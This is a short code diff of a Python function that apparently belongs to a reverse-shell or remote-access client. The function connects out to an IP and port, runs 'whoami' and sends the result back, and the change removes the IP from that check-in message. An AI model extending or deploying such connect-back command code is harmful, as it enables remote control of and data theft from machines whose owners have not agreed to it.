@@ -47,7 +47,7 @@ def establish_connection(ip, port):
     connection.connect((ip, port))
 
     user = execute_system_command("whoami")
-    success_message = "IP: {} | User: {}".format(ip, user)
+    success_message = "User: {}".format(user)
     send_data(connection, success_message)
 
     return connection
